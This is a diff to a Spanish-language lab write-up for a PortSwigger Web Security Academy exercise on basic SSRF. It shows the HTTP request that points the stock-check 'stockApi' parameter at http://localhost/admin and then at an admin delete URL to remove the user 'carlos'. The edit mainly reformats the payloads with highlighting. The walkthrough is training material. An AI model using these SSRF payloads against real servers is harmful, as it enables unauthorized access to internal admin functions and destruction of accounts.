@@ -17,18 +17,17 @@ tags:
 - **Por qué funciona:** el panel admin confía en las peticiones que vienen de **localhost** (sin auth) → el server te lo abre porque la request "sale de él mismo".
 
 ## Cómo explotarlo
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/IP) + el **payload** del ataque (URL interna / Referer / User-Agent).
+
 Interceptá el **"Check stock"** y cambiá `stockApi` por la URL interna:
-```http
-POST /product/stock HTTP/1.1
-Host: LAB.web-security-academy.net
+<pre class="payload"><code>POST /product/stock HTTP/1.1
+Host: <mark>LAB.web-security-academy.net</mark>
 Content-Type: application/x-www-form-urlencoded
 
-stockApi=http://localhost/admin
-```
+stockApi=<mark>http://localhost/admin</mark></code></pre>
 La respuesta trae el HTML del panel. Ahí ves el link de borrado → mandalo:
-```http
-stockApi=http://localhost/admin/delete?username=carlos
-```
+<pre class="payload"><code>stockApi=<mark>http://localhost/admin/delete?username=carlos</mark></code></pre>
 
 ## Verificación
 La respuesta del stock check devuelve el **panel admin** (200 + HTML), y tras el segundo request **carlos desaparece** → lab resuelto.
